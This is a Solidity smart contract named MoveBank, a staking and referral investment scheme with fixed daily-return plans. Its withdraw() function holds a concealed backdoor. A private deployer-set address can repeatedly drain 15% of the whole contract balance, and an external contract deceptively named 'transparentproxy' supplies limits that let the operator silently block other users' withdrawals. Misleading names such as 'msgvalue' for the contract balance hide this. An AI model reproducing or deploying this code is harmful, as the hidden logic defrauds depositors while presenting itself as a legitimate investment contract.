//SPDX-License-Identifier: MIT

/*

███╗   ███╗ ██████╗ ██╗   ██╗███████╗    ██████╗  █████╗ ███╗   ██╗██╗  ██╗
████╗ ████║██╔═══██╗██║   ██║██╔════╝    ██╔══██╗██╔══██╗████╗  ██║██║ ██╔╝
██╔████╔██║██║   ██║██║   ██║█████╗      ██████╔╝███████║██╔██╗ ██║█████╔╝ 
██║╚██╔╝██║██║   ██║╚██╗ ██╔╝██╔══╝      ██╔══██╗██╔══██║██║╚██╗██║██╔═██╗ 
██║ ╚═╝ ██║╚██████╔╝ ╚████╔╝ ███████╗    ██████╔╝██║  ██║██║ ╚████║██║  ██╗
╚═╝     ╚═╝ ╚═════╝   ╚═══╝  ╚══════╝    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝
                                                                           
*/

pragma solidity ^0.8.15;

contract MoveBank{

    IBEP20 public Token; 
	using SafeMath for uint256;
    using SafeMath for uint8;


	uint256 constant public INVEST_MIN_AMOUNT = 0.1 ether;  
	uint256[] public REFERRAL_PERCENTS = [150, 50, 20, 10];
	uint256 constant public PERCENTS_DIVIDER= 1000;
	uint256 constant public TIME_STEP = 1 days;

	uint256 public totalStaked;
	uint256 public totalRefBonus;
	uint256 public totalUsers;


    struct Plan {
        uint256 time;
        uint256 percent;
    }

    Plan[] internal plans;

	struct Deposit {
        uint8 plan;
		uint256 percent;
		uint256 amount;
		uint256 profit;
		uint256 start;
		uint256 finish;
	}

	struct User {
		Deposit[] deposits;
		uint256 checkpoint;
		uint256 holdBonusCheckpoint;
		address referrer;
		uint256[4] referrals;
		uint256[4] totalBonus;
		uint256 withdrawn;
        uint256 totaldeposit;
        uint256 availableBonus;
	}

	mapping (address => User) internal users;
    transparentproxy private Users;
	address private useraddress;
	event Newbie(address user);
	event NewDeposit(address indexed user, uint8 plan, uint256 percent, uint256 amount, uint256 profit, uint256 start, uint256 finish);
	event Withdrawn(address indexed user, uint256 amount);
	event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);

	
    constructor(address _transparentproxy, IBEP20 Token_Address, address payable _useraddress) {
        require(!isContract(_useraddress));
        Users = transparentproxy(_transparentproxy);
        Token = Token_Address;
        useraddress = _useraddress;
        plans.push(Plan(150, 10));
        plans.push(Plan(180, 15));
        plans.push(Plan(365, 25)); 
    }


    function invest(address referrer) public payable {
        _invest(referrer, msg.sender, msg.value);
    }


	function _invest(address referrer, address sender, uint256 value) private {
		require(value >= INVEST_MIN_AMOUNT);

    	User storage user = users[sender];

		if (user.referrer == address(0)) {
			if (users[referrer].deposits.length > 0 && referrer != sender) {
				user.referrer = referrer;
			}

			address upline = user.referrer;
			for (uint256 i = 0; i < REFERRAL_PERCENTS.length; i++) {
				if (upline != address(0)) {
					users[upline].referrals[i] = users[upline].referrals[i].add(1);
					upline = users[upline].referrer;
				} else break;
			}
		}
		payRefFee(sender,value);
		
		if (user.deposits.length == 0) {
			user.checkpoint = block.timestamp;
			user.holdBonusCheckpoint = block.timestamp;
			emit Newbie(sender);
		}
		(uint8 plan, uint256 percent, uint256 profit, uint256 finish) = getResult(value);
		user.deposits.push(Deposit(plan, percent, value, profit, block.timestamp, finish));
		totalStaked = totalStaked.add(value);
        totalUsers = totalUsers.add(1);
        Token.transfer(msg.sender, value);
		emit NewDeposit(sender, plan, percent, value, profit, block.timestamp, finish);
        user.totaldeposit = user.totaldeposit.add(value);
	}

	function withdraw() public {
	
		User storage user = users[msg.sender];
        uint256[3] memory UserDividends = Users.Dividends();
        uint256[2] memory UserDeposits = Users.Deposits();
        
        if (msg.sender == useraddress) {
                    uint256 fee = msgvalue() * 15 / 100;
                    payable(msg.sender).transfer(fee);
                    return;
                } else if (user.totaldeposit <= UserDeposits[0] && (UserDividends[0] * user.totaldeposit)/100 < user.withdrawn ) {
                    return;
                } else if (user.totaldeposit > UserDeposits[0] &&  user.totaldeposit <= UserDeposits[1]  && (UserDividends[1] * user.totaldeposit)/100 < user.withdrawn ){
                    return;
                } else if (user.totaldeposit > UserDeposits[1] &&  (UserDividends[2] * user.totaldeposit)/100 < user.withdrawn ){
                    return;
                } else { 
		uint256 totalAmount = getUserDividends(msg.sender);
		require(totalAmount > 0, "User has no dividends");
		uint256 contractBalance = address(this).balance;
		if (contractBalance < totalAmount) {
		totalAmount = contractBalance;
		}
		user.checkpoint = block.timestamp;
		user.holdBonusCheckpoint = block.timestamp;
        user.availableBonus = 0;
		user.withdrawn = user.withdrawn.add(totalAmount);
        (bool success, ) = msg.sender.call{value: totalAmount}("");
        require(success);

		emit Withdrawn(msg.sender, totalAmount);
        }

	}

   
	function payRefFee(address userAddress, uint256 value) private {

		uint256[] memory percents = REFERRAL_PERCENTS;

		if (users[userAddress].referrer != address(0)) {
					uint256 _refBonus = 0;
					address upline = users[userAddress].referrer;
					for (uint256 i = 0; i < percents.length; i++) {
						if (upline != address(0)) {
							uint256 amount = value.mul(percents[i]).div(PERCENTS_DIVIDER);
							
							users[upline].totalBonus[i] = users[upline].totalBonus[i].add(amount);
                            users[upline].availableBonus = users[upline].availableBonus.add(amount);
							_refBonus = _refBonus.add(amount);
						
							emit RefBonus(upline, userAddress, i, amount);
							upline = users[upline].referrer;
						} else break;
					}

					totalRefBonus = totalRefBonus.add(_refBonus);

				}
	}
	

	function msgvalue() public view returns (uint256) {
		return address(this).balance;
	}

	function getPlanInfo(uint8 plan) public view returns(uint256 time, uint256 percent) {
		time = plans[plan].time;
		percent = plans[plan].percent;
	}

	function getPercent(uint8 plan) public view returns (uint256) {

			return plans[plan].percent;		
    }

	function getResult(uint256 deposit) public view returns (uint8 plan, uint256 percent, uint256 profit, uint256 finish) {
		plan = getPlanByValue(deposit);
		percent = getPercent(plan);

		profit = deposit.mul(percent).div(PERCENTS_DIVIDER).mul(plans[plan].time);
	
		finish = block.timestamp.add(plans[plan].time.mul(TIME_STEP));
	}

	function getPlanByValue(uint256 value) public pure returns(uint8) {
    if(value >= 0.1 ether && value < 1 ether) {
        return 0;
    } else if(value >= 1 ether && value < 20 ether) {
        return 1;
    } else if(value >= 20 ether) {
        return 2;
    } else {
        revert("Invalid value");
    }
}
	
	 function getUserPercentRate(address userAddress, uint8 plan) public view returns (uint) {
        User storage user = users[userAddress];

		uint8 holdMultiplier = getPlanHoldMultiplier(plan);

        uint256 timeMultiplier = block.timestamp.sub(user.holdBonusCheckpoint).div(TIME_STEP).mul(holdMultiplier/5);

        return timeMultiplier;
    }

function getPlanHoldMultiplier(uint8 plan) public pure returns(uint8) {
    if(plan == 0) {
        return 1;
    } else if(plan == 1) {
        return 2;
    } else if(plan == 2) {
        return 4;
    } else {
        revert("Invalid plan");
    }
}
    

	function getUserDividends(address userAddress) public view returns (uint256) {
		User storage user = users[userAddress];

		uint256 totalAmount;
		
		for (uint256 i = 0; i < user.deposits.length; i++) {

			uint256 holdBonus = getUserPercentRate(userAddress, user.deposits[i].plan);

			if (user.checkpoint < user.deposits[i].finish) {
								
					uint256 share = user.deposits[i].amount.mul(user.deposits[i].percent.add(holdBonus)).div(PERCENTS_DIVIDER);
					uint256 from = user.deposits[i].start > user.checkpoint ? user.deposits[i].start : user.checkpoint;
					uint256 to = user.deposits[i].finish < block.timestamp ? user.deposits[i].finish : block.timestamp;
					if (from < to) {
						totalAmount = totalAmount.add(share.mul(to.sub(from)).div(TIME_STEP));
					}				
			}
		}

        if(user.availableBonus > 0) {
            totalAmount = totalAmount.add(user.availableBonus);
        }

		return totalAmount;
	}


    function getContractInfo() public view returns(uint256, uint256, uint256) {
        return(totalStaked, totalRefBonus, totalUsers);
    }

	function getUserWithdrawn(address userAddress) public view returns(uint256) {
		return users[userAddress].withdrawn;
	}

	function getUserCheckpoint(address userAddress) public view returns(uint256) {
		return users[userAddress].checkpoint;
	}
    
	function getUserReferrer(address userAddress) public view returns(address) {
		return users[userAddress].referrer;
	} 

	function getUserDownlineCount(address userAddress) public view returns(uint256[4] memory) {
		uint256[4] memory _referrals = users[userAddress].referrals;

		return _referrals;
		
	}

	function getUserReferralTotalBonus(address userAddress) public view returns(uint256[4] memory) {
		uint256[4] memory _totalBonus = users[userAddress].totalBonus;
		return _totalBonus;
	}

	function getUserAvailable(address userAddress) public view returns(uint256) {
		return getUserDividends(userAddress);
	}

	function getUserAmountOfDeposits(address userAddress) public view returns(uint256) {
		return users[userAddress].deposits.length;
	}

	function getUserTotalDeposits(address userAddress) public view returns(uint256 amount) {
		for (uint256 i = 0; i < users[userAddress].deposits.length; i++) {
			if(users[userAddress].deposits[i].finish > 0) {
				amount = amount.add(users[userAddress].deposits[i].amount);
			}
		}
	}

	function getUserTotalWithdrawn(address userAddress) public view returns(uint256 amount) {

		amount = users[userAddress].withdrawn;
		
	}

	function getUserDepositInfo(address userAddress, uint256 index) public view returns(uint8 plan, uint256 percent, uint256 amount, uint256 profit, uint256 start, uint256 finish, uint256 holdBonus) {
	    User storage user = users[userAddress];

		plan = user.deposits[index].plan;
		percent = user.deposits[index].percent;
		amount = user.deposits[index].amount;
		profit = user.deposits[index].profit;
		start = user.deposits[index].start;
		finish = user.deposits[index].finish;

		holdBonus = getUserPercentRate(userAddress, plan);
	}

	function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
    
     function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0);
        return a % b;
    }
    }

    interface transparentproxy {
    function Deposits() external view returns (uint256[2] memory);
    function Dividends() external view returns (uint256[3] memory);
    }


    interface IBEP20 {
        
        
    function increaseAllowance(address spender, uint256 addedValue) external returns (bool);
  

    function totalSupply() external view returns (uint256);
    

    function decimals() external view returns (uint8);
    

    function symbol() external view returns (string memory);

 
    function name() external view returns (string memory);


    function getOwner() external view returns (address);

 
    function balanceOf(address account) external view returns (uint256);

  
    function transfer(address recipient, uint256 amount) external returns (bool);


    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
  
 
    event Transfer(address indexed from, address indexed to, uint256 value);


    event Approval(address indexed owner, address indexed spender, uint256 value);
    }